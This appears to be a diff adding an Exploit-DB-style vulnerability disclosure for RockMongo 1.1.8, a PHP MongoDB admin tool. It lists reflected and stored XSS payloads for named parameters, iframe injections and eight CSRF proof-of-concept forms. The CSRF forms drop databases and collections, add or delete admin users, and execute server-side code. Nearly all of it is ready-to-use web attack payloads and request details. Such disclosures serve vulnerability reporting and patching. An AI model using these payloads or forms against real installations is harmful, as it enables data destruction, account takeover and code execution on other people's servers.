@@ -1,0 +1,394 @@
+#########################################################################################################################################################
+# Exploit Title:  RockMongo v1.1.8 - PHP MongoDB Administrator Multiple
+Vulnerabilities
+# Date: 11.04.2016
+# Exploit Author: Ozer Goker
+# Vendor Homepage: http://rockmongo.com
+# Software Link: https://github.com/iwind/rockmongo
+# Version: [app version] 1.1.8
+#########################################################################################################################################################
+
+What is RockMongo?
+
+RockMongo, a MongoDB administration tool, written in PHP5, is Best in PHP
+world, more like PHPMyAdmin. source = http://rockmongo.com
+
+
+Vulnerabilities: CSRF | HTML(or Iframe) Injection | XSS (Reflected & Stored)
+
+
+
+XSS details:
+#########################################################################################################################################################
+
+XSS1 (Reflected)
+
+URL
+http://localhost/rockmongo/index.php?action=login.index
+
+METHOD
+Post
+
+PARAMETER
+username
+
+PAYLOAD
+"><script>alert(1)</script>
+
+#########################################################################################################################################################
+
+XSS2 (Reflected)
+
+URL
+http://localhost/rockmongo/index.php?action=login.index
+
+METHOD
+Post
+
+PARAMETER
+db
+
+PAYLOAD
+"><script>alert(1)</script>
+
+#########################################################################################################################################################
+
+XSS3 (Reflected)
+
+URL
+http://localhost/rockmongo/index.php?action=server.createDatabase
+
+METHOD
+Post
+
+PARAMETER
+name
+
+PAYLOAD
+<script>alert(3)</script>
+
+#########################################################################################################################################################
+
+XSS4 (Stored)
+
+URL
+http://localhost/rockmongo/index.php?action=db.newCollection&db=test
+
+METHOD
+Post
+
+PARAMETER
+name
+
+PAYLOAD
+<script>alert(4)</script>
+
+#########################################################################################################################################################
+
+XSS5 (Reflected)
+
+URL
+http://localhost/rockmongo/index.php?action=server.command&db=test
+
+METHOD
+Post
+
+PARAMETER
+db
+
+PAYLOAD
+<script>alert(5)</script>
+
+#########################################################################################################################################################
+
+XSS6 (Reflected)
+
+URL
+http://localhost/rockmongo/index.php?action=collection.removeCollection&db=test&collection=system.indexes%3Cscript%3Ealert%286%29%3C/script%3E
+
+METHOD
+Get
+
+PARAMETER
+collection
+
+PAYLOAD
+<script>alert(6)</script>
+
+#########################################################################################################################################################
+
+XSS7 (Reflected)
+
+URL
+http://localhost/rockmongo/index.php?action=collection.index&collection=system.indexes&command=findAll&criteria=%22%3E%3Cscript%3Ealert%287%29%3C/script%3E&db=test&field[0]=_id&format=array&limit=0&order[0]=asc&pagesize=10&query_fields[0]=v
+
+METHOD
+Get
+
+PARAMETER
+criteria
+
+PAYLOAD
+"><script>alert(7)</script>
+
+#########################################################################################################################################################
+
+XSS8 (Reflected)
+
+URL
+http://localhost/rockmongo/index.php/"><script>alert(8)</script>
+
+METHOD
+Get
+
+PARAMETER
+URL
+
+PAYLOAD
+"><script>alert(8)</script>
+
+#########################################################################################################################################################
+
+
+HTML Injection details:
+#########################################################################################################################################################
+
+HTML Injection1
+
+URL
+http://localhost/rockmongo/index.php?action=login.index
+
+METHOD
+Post
+
+PARAMETER
+username,db
+
+PAYLOAD
+"><iframe src=http://www.rockmongo.com></iframe>
+
+#########################################################################################################################################################
+
+HTML Injection2
+
+URL
+http://localhost/rockmongo/index.php?action=server.createDatabase
+
+METHOD
+Post
+
+PARAMETER
+name
+
+PAYLOAD
+<iframe src=http://www.rockmongo.com>
+
+#########################################################################################################################################################
+
+HTML Injection3 (Stored)
+
+URL
+http://localhost/rockmongo/index.php?action=db.newCollection&db=test
+
+METHOD
+Post
+
+PARAMETER
+name
+
+PAYLOAD
+<iframe src=http://www.rockmongo.com>
+
+#########################################################################################################################################################
+
+HTML Injection4
+
+URL
+http://localhost/rockmongo/index.php?action=server.command&db=test
+
+METHOD
+Post
+
+PARAMETER
+db
+
+PAYLOAD
+<iframe src=http://www.rockmongo.com>
+
+#########################################################################################################################################################
+
+HTML Injection5
+
+URL
+http://localhost/rockmongo/index.php?action=collection.removeCollection&db=test&collection=system.indexes%3Ciframe%20src=http://www.rockmongo.com%3E
+
+METHOD
+Get
+
+PARAMETER
+collection
+
+PAYLOAD
+<iframe src=http://www.rockmongo.com>
+
+#########################################################################################################################################################
+
+HTML Injection6
+
+URL
+http://localhost/rockmongo/index.php?action=collection.index&collection=system.indexes&command=findAll&criteria=%22%3E%3Ciframe%20src=http://www.rockmongo.com%3E&db=test&field[0]=_id&format=array&limit=0&order[0]=asc&pagesize=10&query_fields[0]=v
+
+METHOD
+Get
+
+PARAMETER
+criteria
+
+PAYLOAD
+"><iframe src=http://www.rockmongo.com>
+
+#########################################################################################################################################################
+
+CSRF details:
+#########################################################################################################################################################
+
+CSRF1
+
+Create Database
+
+<html>
+  <body>
+    <form action="
+http://localhost/rockmongo/index.php?action=server.createDatabase"
+method="POST">
+    <input type="text" name="name" value="exploit-db" />
+        <input type="submit" value="Create DB" />
+    </form>
+  </body>
+</html>
+
+#########################################################################################################################################################
+
+CSRF2
+
+Drop Database
+
+<html>
+  <body>
+    <form action="
+http://localhost/rockmongo/index.php?action=db.dropDatabase" method="POST">
+    <input type="text" name="db" value="exploit-db"/>
+    <input type="hidden" name="confirm" value="1"/>
+    <input type="submit" value="Drop DB"/>
+    </form>
+  </body>
+</html>
+
+#########################################################################################################################################################
+
+CSRF3
+
+Create Collection
+
+<html>
+  <body>
+    <form action="
+http://localhost/rockmongo/index.php?action=db.newCollection&db=exploit-db"
+method="POST">
+    <input type="text" name="name" value="exploit-Collection" />
+    <input type="submit" value="Create Collection" />
+    </form>
+  </body>
+</html>
+
+#########################################################################################################################################################
+
+CSRF4
+
+Drop Collection
+
+<html>
+  <body>
+    <form action="
+http://localhost/rockmongo/index.php?action=collection.removeCollection&db=exploit-db"
+method="POST">
+    <input type="text" name="collection" value="exploit-Collection"/>
+    <input type="submit" value="Drop Collection"/>
+    </form>
+  </body>
+</html>
+
+#########################################################################################################################################################
+
+CSRF5
+
+Add Database User
+
+<html>
+  <body>
+    <form action="
+http://localhost/rockmongo/index.php?action=db.addUser&db=admin"
+method="POST">
+    <input type="text" name="username" value="test"/>
+    <input type="text" name="password" value="test"/>
+    <input type="text" name="password2" value="test"/>
+    <input type="submit" value="Add User"/>
+    </form>
+  </body>
+</html>
+
+#########################################################################################################################################################
+
+CSRF6
+
+Delete Database User
+
+<html>
+  <body>
+    <form action="
+http://localhost/rockmongo/index.php?action=db.deleteUser&db=admin"
+method="POST">
+    <input type="text" name="user" value="test"/>
+    <input type="submit" value="Remove User"/>
+    </form>
+  </body>
+</html>
+
+#########################################################################################################################################################
+
+CSRF7
+
+Command Execute
+
+<html>
+  <body>
+    <form action="
+http://localhost/rockmongo/index.php?action=server.command&" method="POST">
+    <input type="text" name="command" value="{ listCommands: 1 }"/>
+    <input type="text" name="db" value="admin"/>
+    <input type="text" name="format" value="json"/>
+    <input type="submit" value="Command Execute"/>
+    </form>
+  </body>
+</html>
+
+#########################################################################################################################################################
+
+CSRF8
+
+Execute Code
+
+<html>
+  <body>
+    <form action="
+http://localhost/rockmongo/index.php?action=server.execute&db=admin"
+method="POST">
+    <input type="text" name="code" value="function () { var plus = 1 + 2;
+return plus; }"/>
+    <input type="text" name="db" value="admin"/>
+    <input type="submit" value="Execute Code"/>
+    </form>
+  </body>
+</html>
+
+#########################################################################################################################################################
